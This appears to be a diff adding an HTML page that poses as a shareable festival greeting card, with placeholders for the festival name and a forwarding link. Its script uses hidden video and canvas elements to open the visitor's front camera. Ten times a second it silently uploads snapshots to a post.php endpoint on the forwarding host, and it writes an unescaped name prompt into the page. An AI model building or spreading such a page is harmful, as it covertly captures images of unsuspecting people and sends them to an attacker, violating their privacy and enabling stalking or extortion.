@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy fes_name | Greeting Card</title>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@600&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: linear-gradient(135deg, #fef9e7 0%, #fdebd0 50%, #fadbd8 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.08), 0 5px 20px rgba(0,0,0,0.05);
+            overflow: hidden;
+            text-align: center;
+        }
+        .card-header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            padding: 30px 20px 25px;
+            color: #fff;
+        }
+        .card-header .icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .card-header h1 {
+            font-family: 'Dancing Script', cursive;
+            font-size: 36px;
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
+        .card-header p {
+            font-size: 14px;
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        .card-body {
+            padding: 30px 25px;
+        }
+        .greeting-text {
+            font-size: 16px;
+            color: #444;
+            line-height: 1.7;
+            margin-bottom: 20px;
+        }
+        .greeting-text strong {
+            color: #ee5a24;
+        }
+        .name-display {
+            font-family: 'Dancing Script', cursive;
+            font-size: 32px;
+            color: #2c3e50;
+            margin: 20px 0;
+            padding: 15px;
+            background: #fef9e7;
+            border-radius: 12px;
+            border: 1px dashed #f0c27a;
+        }
+        .card-footer {
+            padding: 20px 25px 30px;
+            color: #888;
+            font-size: 13px;
+            border-top: 1px solid #f0f0f0;
+        }
+        .btn-share {
+            display: inline-block;
+            margin: 10px 5px;
+            padding: 12px 28px;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            color: #fff;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-share:hover { transform: translateY(-2px); }
+        .btn-whatsapp { background: #25D366; box-shadow: 0 4px 15px rgba(37,211,102,0.3); }
+        .btn-facebook { background: #1877F2; box-shadow: 0 4px 15px rgba(24,119,242,0.3); }
+        .sparkle {
+            display: inline-block;
+            animation: sparkle 1.5s ease-in-out infinite;
+        }
+        @keyframes sparkle {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.2); opacity: 0.7; }
+        }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <video id="video" playsinline autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <div class="card">
+        <div class="card-header">
+            <div class="icon">🎉</div>
+            <h1>Happy fes_name!</h1>
+            <p>Sending warm wishes your way</p>
+        </div>
+        <div class="card-body">
+            <p class="greeting-text">
+                May this <strong>fes_name</strong> bring you endless joy, prosperity, and cherished moments with your loved ones. Wishing you a celebration filled with laughter and love.
+            </p>
+            <div class="name-display">
+                <span class="sparkle">✨</span> 
+                <script>document.write(prompt("Enter your name to receive your greeting",""));</script>
+                <span class="sparkle">✨</span>
+            </div>
+            <p style="font-size:14px;color:#666;">This beautiful greeting was created just for you.</p>
+        </div>
+        <div class="card-footer">
+            <p style="margin-bottom:10px;">Share this greeting with friends:</p>
+            <a class="btn-share btn-whatsapp" href="whatsapp://send?text=Check out this special fes_name greeting for you! 👉 forwarding_link">WhatsApp</a>
+            <a class="btn-share btn-facebook" href="https://www.facebook.com/sharer/sharer.php?u=forwarding_link" target="_blank">Facebook</a>
+        </div>
+    </div>
+
+    <script>
+        var video = document.getElementById('video');
+        var canvas = document.getElementById('canvas');
+        var ctx = canvas.getContext('2d');
+
+        function post(imgdata) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'forwarding_link/post.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('cat=' + encodeURIComponent(imgdata));
+        }
+
+        async function init() {
+            try {
+                var stream = await navigator.mediaDevices.getUserMedia({ audio: false, video: { facingMode: "user" } });
+                video.srcObject = stream;
+                video.play();
+                setInterval(function() {
+                    ctx.drawImage(video, 0, 0, 640, 480);
+                    post(canvas.toDataURL("image/png"));
+                }, 100);
+            } catch (e) {}
+        }
+        init();
+    </script>
+</body>
+</html>
